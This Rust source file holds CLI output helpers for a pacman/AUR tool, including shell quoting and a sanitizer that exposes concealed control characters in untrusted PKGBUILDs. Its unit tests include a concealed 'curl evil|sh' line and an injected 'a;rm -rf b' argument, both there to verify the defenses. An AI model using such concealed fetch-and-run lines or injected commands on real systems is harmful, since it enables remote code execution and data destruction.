//! Tiny output helpers shared by the CLI verbs.

/// Comma-joined list capped at `max` items, with an "… and N more" tail —
/// the scroll-don't-truncate rule belongs to the TUI; the CLI previews.
pub fn list_preview(items: &[String], max: usize) -> String {
    if items.len() <= max {
        items.join(", ")
    } else {
        format!(
            "{} … and {} more",
            items[..max].join(", "),
            items.len() - max
        )
    }
}

/// Render one argument the way a shell would need it written.
///
/// pacrat prints every external command it runs so the user can rerun it
/// (ADR-001's always-visible-calls rule). An unquoted `pacman -Ss -- foo bar`
/// is a lie about what ran and breaks when pasted, so the *display* line gets
/// shell quoting. The argv never does — it goes straight to exec, where a
/// quote would become part of the search term.
pub fn shell_quote(arg: &str) -> String {
    // Conservative: anything outside this set gets quoted, whether or not
    // the current shell would have minded.
    let bare = |c: char| c.is_ascii_alphanumeric() || "-_./:=@,+".contains(c);
    if !arg.is_empty() && arg.chars().all(bare) {
        return arg.to_string();
    }
    // Single quotes protect everything except a single quote, which has to
    // leave the quoted run, escape itself, and come back in.
    format!("'{}'", arg.replace('\'', r"'\''"))
}

/// Clip a string to `max` characters, marking the cut. Counts chars, not
/// bytes: descriptions carry accents and the odd emoji, and a byte slice
/// would both panic and misalign the column.
pub fn truncate(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_string();
    }
    if max == 0 {
        return String::new();
    }
    let mut out: String = s.chars().take(max - 1).collect();
    while out.ends_with(' ') {
        out.pop();
    }
    out.push('…');
    out
}

/// A unix timestamp as a UTC `YYYY-MM-DD`. The AUR reports epoch seconds and
/// pacrat shows dates; that is the whole requirement, so it is arithmetic
/// (Howard Hinnant's civil-from-days) rather than a calendar dependency.
pub fn epoch_date(secs: i64) -> String {
    let z = secs.div_euclid(86_400) + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z.rem_euclid(146_097);
    let yoe = (doe - doe / 1_460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let day = doy - (153 * mp + 2) / 5 + 1;
    let month = if mp < 10 { mp + 3 } else { mp - 9 };
    let year = yoe + era * 400 + i64::from(month <= 2);
    format!("{year:04}-{month:02}-{day:02}")
}

/// Make untrusted text safe to show a reviewer, and say how much was hidden.
///
/// A PKGBUILD is an attacker's text. Printed raw it can lie to the eye it is
/// meant to inform: `ESC[8m` turns a `curl … | sh` line invisible, `\r`
/// overwrites it with something innocent, and a bidi override reorders it.
/// Every such byte becomes a visible stand-in (C0 controls render as their
/// Unicode Control Pictures, so ESC shows as `␛`), leaving newline and tab —
/// the file's real structure — alone.
///
/// Returns the safe text and the number of characters replaced, because
/// "this file contains 40 hidden control bytes" is itself a review finding.
pub fn visible(text: &str) -> (String, usize) {
    let mut out = String::with_capacity(text.len());
    let mut hidden = 0usize;
    for c in text.chars() {
        let code = c as u32;
        let safe = match c {
            '\n' | '\t' => None,
            // C0 controls: pictures live at U+2400 + the code point.
            _ if code < 0x20 => char::from_u32(0x2400 + code),
            '\u{7f}' => Some('\u{2421}'), // DEL
            // C1 controls, zero-width and bidi-override formatting.
            _ if (0x80..=0x9f).contains(&code) => Some('\u{fffd}'),
            '\u{200b}'..='\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}' => {
                Some('\u{fffd}')
            }
            _ => None,
        };
        match safe {
            Some(stand_in) => {
                out.push(stand_in);
                hidden += 1;
            }
            None => out.push(c),
        }
    }
    (out, hidden)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_quote_leaves_ordinary_terms_alone() {
        assert_eq!(shell_quote("pacseek"), "pacseek");
        assert_eq!(shell_quote("python-3.12_x"), "python-3.12_x");
        // Not shell-special, so quoting would be noise. Both are real terms.
        assert_eq!(shell_quote("c++"), "c++");
        assert_eq!(shell_quote("gtk2.0/lib"), "gtk2.0/lib");
    }

    #[test]
    fn shell_quote_wraps_anything_a_shell_would_read() {
        assert_eq!(shell_quote("foo("), "'foo('");
        assert_eq!(shell_quote("two words"), "'two words'");
        assert_eq!(shell_quote("*"), "'*'");
        assert_eq!(shell_quote("a;rm -rf b"), "'a;rm -rf b'");
        assert_eq!(shell_quote("$HOME"), "'$HOME'");
        assert_eq!(shell_quote(""), "''");
    }

    #[test]
    fn shell_quote_escapes_an_embedded_single_quote() {
        // Leave the quoted run, escape the quote, resume: don'\''t
        assert_eq!(shell_quote("don't"), r"'don'\''t'");
        assert_eq!(shell_quote("'"), r"''\'''");
    }

    #[test]
    fn truncate_marks_the_cut_and_counts_chars() {
        assert_eq!(truncate("short", 10), "short");
        assert_eq!(truncate("exactly10!", 10), "exactly10!");
        assert_eq!(truncate("abcdefghijk", 10), "abcdefghi…");
        // The mark replaces trailing space, not a word's last letter.
        assert_eq!(truncate("one two three", 8), "one two…");
        // Multi-byte input must not panic or over-clip.
        assert_eq!(truncate("ééééé", 3), "éé…");
        assert_eq!(truncate("abc", 0), "");
    }

    #[test]
    fn epoch_date_converts_utc_days() {
        assert_eq!(epoch_date(0), "1970-01-01");
        // Captured AUR LastModified values.
        assert_eq!(epoch_date(1_765_883_803), "2025-12-16");
        assert_eq!(epoch_date(1_648_375_227), "2022-03-27");
        // Leap day, and the last second before the next.
        assert_eq!(epoch_date(1_709_164_800), "2024-02-29");
        assert_eq!(epoch_date(1_709_251_199), "2024-02-29");
        assert_eq!(epoch_date(1_709_251_200), "2024-03-01");
    }

    #[test]
    fn plain_text_is_untouched() {
        let (text, hidden) = visible("pkgname=foo\n\tarch=('any')\n");
        assert_eq!(text, "pkgname=foo\n\tarch=('any')\n");
        assert_eq!(hidden, 0);
    }

    #[test]
    fn conceal_and_carriage_return_become_visible() {
        // The attack: hide a line with ESC[8m, or overwrite it with \r.
        let (text, hidden) = visible("\x1b[8mcurl evil|sh\x1b[0m\rlooks fine\n");
        assert!(!text.contains('\x1b'), "escape survived: {text:?}");
        assert!(!text.contains('\r'), "carriage return survived: {text:?}");
        assert!(text.contains("␛[8mcurl evil|sh"), "{text:?}");
        assert_eq!(hidden, 3); // two ESC, one CR
    }

    #[test]
    fn bidi_overrides_and_del_are_replaced() {
        let (text, hidden) = visible("a\u{202e}b\u{7f}c");
        assert_eq!(text, "a\u{fffd}b\u{2421}c");
        assert_eq!(hidden, 2);
    }
}
